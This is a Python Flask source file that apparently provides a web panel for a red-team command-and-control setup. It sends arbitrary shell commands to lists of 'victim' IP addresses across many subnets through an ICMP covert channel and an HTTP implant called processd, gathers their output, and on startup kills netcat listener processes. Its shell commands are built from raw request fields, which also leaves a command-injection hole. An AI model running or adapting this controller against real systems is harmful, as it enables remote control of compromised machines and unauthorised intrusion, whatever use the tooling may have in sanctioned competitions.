from flask import Flask, render_template, request
from os import popen, system
from json import dumps
import threading
mutex = threading.Lock()

app = Flask("__app__")

from pathlib import Path
dirname = Path(__file__).parent.resolve()

@app.route("/")
def index():
    return render_template("index.html")

def icmp_at(vic_ip, command, outputs=None):
    print(f"Trying {vic_ip}")
    with popen(f"echo \"{command}\n\" | python3 {dirname}/../icmp-c2/send_command.py {vic_ip}") as f:
        raw = f.read()
    output = raw.split("\n", 1)[1]
    print(f"{vic_ip}: {output}")
    if outputs is not None:
        with mutex:
            outputs[vic_ip] = output
    else:
        return output
def http_at(vic_ip, command, outputs=None):
    print(f"Trying {vic_ip}")
    with mutex:
        with popen(f"echo \"{vic_ip}\n{command}\n\" | python3 {dirname}/../processd/send_command.py") as f:
            raw = f.read()
        output = raw.split("\n", 1)[1]
        print(f"{vic_ip}: {output}")
        if outputs is not None:
            outputs[vic_ip] = output
        else:
            return output

device_mappings = {
    "ad": 60,
    "ubuntu1": 10,
    "ubuntu2": 40,
    "webapp": 30,
    "windows1": 70,
    "windows2": 80
}

def run(devices, command):
    threads = []
    outputs = {}
    for device in list(devices):
        if request.json["use"] == "icmp":
            thread = threading.Thread(target=icmp_at, args=(device, command, outputs), daemon=True)
        elif request.json["use"] == "processd":
            thread = threading.Thread(target=http_at, args=(device, command, outputs), daemon=True)
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    return dumps(outputs).replace("\\",r"\\")

@app.route("/run", methods=["POST"])
def handle_run():
    if request.json["use"] not in ("icmp", "processd"):
        return "invalid use value"
    # Does nothing with return port
    include = request.json['include']
    command = request.json['command']
    devices = set()
    for value in include:
        if value in list(device_mappings):
            for i in range(1,16):
                devices.add(f"10.{i+1}.1.{device_mappings[value]}")
        else:
            devices.add(value)
    return run(devices, command)
    # outputs = {}
    # for device in list(devices):
    #     if request.json["use"] == "icmp":
    #         outputs[device] = icmp_at(device, command)
    #     elif request.json["use"] == "processd":
    #         outputs[device] = http_at(device, command)
    # return dumps(outputs).replace("\\",r"\\")


@app.route("/processd", methods=["POST"])
def processd():
    # Does nothing with return port
    vic_ip = request.json['vic_ip']
    command = request.json['command']
    with popen(f"echo \"{vic_ip}\n{command}\n\" | python3 {dirname}/../processd/send_command.py") as f:
        raw = f.read()
    print(f"Processd raw: {raw}")
    output = raw.split("\n", 1)[1]
    return output

@app.route("/icmp", methods=["POST"])
def icmp():
    vic_ip = request.json['vic_ip']
    command = request.json['command']
    with popen(f"echo \"{command}\n\" | python3 {dirname}/../icmp-c2/send_command.py {vic_ip}") as f:
        raw = f.read()
    print(f"ICMP: {raw}")
    output = raw.split("\n", 1)[1]
    return output

if __name__ == "__main__":
    system("ps -aux | awk '/send_/||/nc -nlp/{print $2}' | xargs kill -9")
    app.run(host="0.0.0.0", port=80)